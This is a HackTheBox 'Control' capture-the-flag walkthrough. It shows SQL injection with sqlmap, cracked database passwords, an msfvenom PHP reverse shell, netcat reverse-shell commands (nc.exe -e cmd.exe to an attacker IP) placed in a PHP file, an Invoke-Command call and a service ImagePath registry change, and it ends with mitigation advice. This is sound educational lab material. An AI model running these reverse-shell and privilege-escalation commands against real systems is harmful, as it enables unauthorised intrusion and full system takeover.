---
title: HackTheBox - Control
author: solidgoat
date: 2023-01-06 21:00:00 EDT
categories: [HackTheBox, Machines]
tags: [windows, ctf, hackthebox, htb, walkthrough, hard, powershell, iis, mysql, sql, sqli, injection, sql injection, password reuse, password cracking, web]
image:
  path: /assets/img/posts/Control/htb-control-logo.png
  width: 800
  height: 500
  alt: Walkthrough of Control from HackTheBox
---

## Overview

This is a Windows 2019 Server running MySQL with a Microsoft IIS 10.0 webserver frontend. Initial access is gained through SQL injection due to an unsantitzied portion of the PHP code running on the webserver. Leveraging the SQL injection vulnerability, portions of the backend database are acquired, which essentially includes the entire database, but more importantly includes: tables, users, and password hashes. Low-level user access is gained through cracking one of the hashes of one of the database users, which was reused as a Windows password on the local server. Privilege escalation is established through a misconfiguration of the permissions controlling the Windows services. The non-administrative user has the ability to modify the executable of all the services and has the ability to start most of the services. Leveraging this allowed for a reverse shell to be established using a service that is executed as `NT AUTHORITY\SYSTEM`.

### Tools Used

* [Nmap](https://nmap.org/download)
* [gobuster](https://www.kali.org/tools/gobuster/)
* [Burp Suite](https://portswigger.net/burp/communitydownload)
* [sqlmap](https://github.com/sqlmapproject/sqlmap)
* [CrackStation](https://crackstation.net/)
* [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
* PowerShell

## Enumeration

### Port Scan
Running an Nmap TCP scan on against all ports (`0 - 65536`) on `10.10.10.167` shows that this is a webserver running some sort of database - maybe MySQL.

Ports: `80/TCP` (HTTP) and `3306/TCP` (MySQL) being the main indicators.

```
# Nmap 7.93 scan initiated Fri Jan  6 19:42:59 2023 as: nmap -v -T4 -Pn -n -O --osscan-limit -sC -sV -p- --open -oA nmap-tcp-all-full --min-parallelism 100 --min-rate 2000 10.10.10.167
Skipping OS Scan against 10.10.10.167 due to absence of open (or perhaps closed) ports
Nmap scan report for 10.10.10.167
Host is up (0.018s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
|_http-title: Fidelity
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings: 
|   RPCCheck, X11Probe: 
|_    Host '10.10.14.4' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=1/6%Time=63B8C061%P=x86_64-pc-linux-gnu%r(RPC
SF:Check,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.4'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4
SF:9,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.4'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  6 19:45:04 2023 -- 1 IP address (1 host up) scanned in 125.65 seconds
```

### Information Gathering

#### Webserver

Browsing around the website shows some of the links and wording are just place holders. However, clicking on the Admin link in the top right menu provides an interesting error message.

<img src="/assets/img/posts/Control/homepage-menu.png" width="50%" height="50%">

We're denied access because we're not going through the proxy and we're missing headers in our request - I'll come back to this later.

<img src="/assets/img/posts/Control/admin-page-access-denied.png" width="85%" height="85%">

We see two interesting files while enumerating the directory with `gobuster` (I used the `raft-medium-words.txt` wordlist from [SecLists](https://github.com/danielmiessler/SecLists)).

* `/DataBase.php`
* `/search_products.php`

<img src="/assets/img/posts/Control/gobuster-files.png">

We get the same access denied error message when we try to navigate to `/search_products.php` directly.

<img src="/assets/img/posts/Control/search_products-access-denied.png" width="85%" height="85%">

I used Burp Suite to make it easier to play with the headers of the request. Since the error message was complaining about headers and proxies, I decided to add the following headers to my request.

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```

But that didn't work.

Exploring the source code of the homepage, we see an interesting comment.

<img src="/assets/img/posts/Control/homepage-source.png" width="75%" height="75%">

I added that IP (`192.168.4.28`) to my header.

<img src="/assets/img/posts/Control/x-forwarded-for.png" width="75%" height="75%">

And was able to get to the Admin portal.

<img src="/assets/img/posts/Control/search_products-admin.png">

#### SQLi

Since this was running PHP, my inital thought was to try to upload a PHP file with code to establish a reverse shell, but I didn't see a way of doing that while clicking around the site.

I decided to perform different actions on the webpage (View, Update, Delete, Create Product, and Create Category), save those requests from Burp, then use those in `sqlmap` to see if any were vulnerable to SQL injection.

```
$ sqlmap -r ./view_product.req --current-user --current-db --passwords
```

And I found one.

<img src="/assets/img/posts/Control/sqlmap-view_product-injectable.png">

Looks like `view_product.php` was vulnerable to a few SQL injection attacks.

Using this vulnerability, I was able to dump the tables, users, and password hashes.

<img src="/assets/img/posts/Control/sqlmap-view_product-hashes.png">

Dumping the hashes into [CrackStation](https://crackstation.net/), I was able to get the passwords for the `hector:l33th4x0rhector` and `manager:l3tm3!n` DB users. I was not able to get root, which is on par with most HTB boxes.

We also know that this is a MySQL >= 5.0.12 server.

<img src="/assets/img/posts/Control/crackstation-mysql-hashes.png">

## Low-Level Access

We know this is a Windows IIS webserver running PHP, so I wanted to see if I could read files using the same SQL injection vulnerability we discovered and exploited earlier with `sqlmap`.

```
$ sqlmap -r ./view_product.req --file-read="c:\inetpub\wwwroot\database.php"
```

Looks like we can.

Note: The `database.php` also contains the `manager:l3tm3!n` password, so we could have gotten it that way without decrypting the hash.

<img src="/assets/img/posts/Control/sqlmap-read-file.png">

I was curious if I could also write files using the same method.

I create a PHP reverse shell using `msfvenom` and was able to upload it to the server.

```
$ msfvenom -p php/reverse_php LHOST=10.10.14.4 LPORT=4444 -o shell.php            
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3042 bytes
Saved as: shell.php
```

Then running a `netcat` listener, I was able to gain remote access as the `iis apppool\wifidelity` user.

<img src="/assets/img/posts/Control/low-level-remote-access-wifidelity.png" width="75%" height="75%">

However, that connection would die every so often if I wasn't actively using it.

Using the same exploit, I decided to upload `nc.exe` to the `C:\inetpub\wwwroot\uploads\` directory, along with a new PHP file (`rev.php`) to execute it.

`rev.php` contents:
```
<?php system('c:\inetpub\wwwroot\uploads\nc.exe -e cmd.exe 10.10.14.4 4444') ?>
```

<img src="/assets/img/posts/Control/sqlmap-write-file-nc_exe.png">

Remoting in this way gave me a different user - `nt authority\iusr`. Not sure if that's better, but I have a slightly better shell since I can see my current directory.

<img src="/assets/img/posts/Control/low-level-remote-access-iusr.png" width="75%" height="75%">

## User Flag

Looks like we can't run many commands; even `systeminfo` throws an `Access denied` error.

<img src="/assets/img/posts/Control/systeminfo-iusr-access-denied.png" width="50%" height="50%">

Running `net users`, we can see that we also have a user named `Hector`, which matches one of the users we have from the MySQL database.

```
C:\inetpub\wwwroot>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
Hector                   WDAGUtilityAccount       
The command completed with one or more errors.
```

And since we have credentials from the MySQL database, specifically for the `hector` user, we can try to reuse them.

I dropped into a PowerShell session using: `powershell -nop -exec bypass`.

Then executed the following commands to store the credentials `l33th4x0rhector` and username `hector`, and use `Invoke-Command` to start another reverse shell as the `hector` user using `nc.exe`, which is already uploaded to the server.

```
PS C:\inetpub\wwwroot> $password=ConvertTo-SecureString 'l33th4x0rhector' -Asplaintext -force
$password=ConvertTo-SecureString 'l33th4x0rhector' -Asplaintext -force

PS C:\inetpub\wwwroot> $creds=New-Object System.Management.Automation.PSCredential(".\hector", $password)
$creds=New-Object System.Management.Automation.PSCredential(".\hector", $password)

PS C:\inetpub\wwwroot> Invoke-Command -ComputerName . -Credential $creds -ScriptBlock {cmd /c "c:\inetpub\wwwroot\uploads\nc.exe 10.10.14.4 5555 -e cmd.exe"}
Invoke-Command -ComputerName . -Credential $creds -ScriptBlock {cmd /c "c:\inetpub\wwwroot\uploads\nc.exe 10.10.14.4 5555 -e cmd.exe"}
```

And I was able to gain remote access as the `hector` user.

<img src="/assets/img/posts/Control/nc-reverse-shell-hector.png" width="50%" height="50%">

And get the `user.txt` flag.

<img src="/assets/img/posts/Control/user-flag.png" width="50%" height="50%">

## Privilege Escalation

Now that we can copy files and we have an actual user account to run commands against, I retried some of the previous commands that failed, like `systeminfo`.

And they still failed.

<img src="/assets/img/posts/Control/systeminfo-hector-access-denied.png" width="50%" height="50%">

I also tried to reuse the passwords that were gathered for the `manage` and `hector` users in an attempt to run commands as the local `Administrator`, but neither of those worked.

<img src="/assets/img/posts/Control/powershell-admin-password-fail.png">

I decided to copy [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) to the server, using the same method as before (SQLi), and run that using the `Hector` account.

A couple of interesting things were discovered:

* PowerShell `ConsoleHost_history.txt`

<img src="/assets/img/posts/Control/winpeas-powershell-history.png">

* Which contained the following commands that gave me some ideas for later privilege escalation:

<img src="/assets/img/posts/Control/consolehost-history-contents.png">

* Hector has full control all the registry keys for `HKLM:\SYSTEM\CurrentControlSet\Services`
   * i.e. This account is able to modify the configuration of every Windows service on this server

<img src="/assets/img/posts/Control/winpeas-services-full-control.png">

### Execution

I attempted to list all the services, but since I'm not in an interactive session, that fails.

<img src="/assets/img/posts/Control/get-service-access-denied.png">

Next I decided to pick a service at random - `ConsentUxUserSvc`.

<img src="/assets/img/posts/Control/get-service-consentuxusersvc.png" width="50%" height="50%">

Looks like I can view the service, but we can't just choose any service. It has to be one that's executed with higher privileges, like `NT AUTHORITY\SYSTEM` or `BUILTIN\Administrators`.

If I run the following, we can see that the owner of `ConsentUxUserSvc` is `NT AUTHORITY\SYSTEM`:

`(Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\ConsentUxUserSvc").PSPath | Get-Acl | fl`

<img src="/assets/img/posts/Control/get-childitem-consentuxusersvc-permissions.png">

So all we have to do is change the `ImagePath` to point to something else, like a reverse shell, and start the service.

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ConsentUxUserSvc /v ImagePath /D "c:\inetpub\wwwroot\uploads\nc.exe -e cmd.exe 10.10.14.5 6666"
```

And that fails.

<img src="/assets/img/posts/Control/start-service-consentuxusersvc-fail.png">

So I need a way to get all the services that are executed using an administrative account and that I can actually start.

I created this PowerShell script that I decided to run in pieces because the output was weird and wouldn't work correctly. Also because of that, I decided to dump of the information to files to the local disk.

```PowerShell
$services = ((Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services\rasman').PSPath | Get-Acl | Where {$_.Owner -eq 'BUILTIN\Administrators' -or $_.Owner -eq 'NT AUTHORITY\SYSTEM'}).PSChildName

$usableServices = ForEach ($service in $services)
{
    (Get-Service $service -ErrorAction SilentlyContinue).ServiceName
}

$usableServices | Out-File usableServices.txt

ForEach ($usableService in Get-Content "usableServices.txt")
{
    $sddl = cmd /c sc sdshow $usableService
    
    Write-Host $usableService | Out-File servicePermissions.txt
    Write-Host "" | Out-File servicePermissions.txt -Append
    Write-Host $sddl | Out-File servicePermissions.txt -Append
    Write-Host "" | Out-File servicePermissions.txt -Append
}
```

Running that code produced this lovely output:

```
applockerfltr

D:P(A;CI;CCLCSWLORC;;;BU)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;CCLCSWRPWPDTLOCRRC;;;LS)(A;CI;CCLCSWRPWPDTLOCRRC;;;S-1-5-80-2078495744-2416903469-4072184685-3943858305-976987417)(A;CI;CCLCSWLOR
C;;;AC)

AppMgmt

D:(A;;CCLCSWLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPLO;;;IU)(A;;CCLCSWLO;;;BU)

AppVClient

D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)

BFE

D:(A;;CCLCLORC;;;AU)(A;;CCDCLCSWRPLORCWDWO;;;SY)(A;;CCLCSWRPLORCWDWO;;;BA)(A;;CCLCLO;;;BU)

BrokerInfrastructure

D:(A;;CCLCLORC;;;AU)(A;;CCDCLCSWRPWPDTLORCWDWO;;;SY)(A;;CCLCSWRPWPDTLORCWDWO;;;BA)(A;;CCLCRPLO;;;BU)

CLFS

D:P(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CI;CCLCSWLORC;;;SY)(A;CI;CCLCSWLORC;;;BA)(A;CI;CCLCSWLORC;;;BU)(A;CI;CCLCSWLORC;;;AC)(A;CI;CCLCSWLORC;;;S-1-15-3-1024-1065365936-128
1604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)

ClipSVC

[SC] OpenService FAILED 5:  Access is denied.

ConsentUxUserSvc

D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)

ConsentUxUserSvc_4a8f9

D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
```

I tried to use [ConvertFrom-SddlString](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.3) so the `sddl` information would look normal, but I couldn't get it to work. It worked, but it looked like it was displaying permissions for files instead of services.

I wasn't seeing anything that was `SERVICE_START` or `SERVICE_STOP`.

<img src="/assets/img/posts/Control/get-services-garbage.png">

So I decided to research how to interpret Windows service sddl. [This](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/) was a good article.

I'm sure there was a better way to do this next part, but I didn't feel like playing with the PowerShell code anymore, so I decided to just test each service invidually.

I finally found one that worked - `seclogon`.

I modified the `ImagePath` to use `nc.exe` to start a reverse shell back to my attack machine and gained access as `NT AUTHORITY\SYSTEM`.

<img src="/assets/img/posts/Control/seclogon-imagepath-change.png">

<img src="/assets/img/posts/Control/root-flag.png" width="50%" height="50%">

## Mitigation

### SQLi Mitigation
* `Line 64` of `view_product.php` is the part of the PHP code that's vulnerable to SQL injection.
  * `$id` within `"SELECT pack_id FROM product_pack WHERE product = "` is not propertly being sanitized when building the SQL query

<img src="/assets/img/posts/Control/view_product-vulnerable-code.png">

* PDO is a database abstraction layer and is already built into PHP and will sanitize and embed external data into a SQL query in a safe way
  * Potential example code:

    ```
    $stmt = $pdo->prepare("SELECT pack_id FROM product_pack WHERE product = :id");
    $stmt->execute(['id' => $id]); 
    $user = $stmt->fetch();
    ```

### Password Reuse Mitigation
* You should never reuse passwords across applications or systems
* Enforce complex password policies
  * The hashes gathered were in a popular password cracking dictionary (`rockyou.txt`), so a basic dictionary attack was all that was needed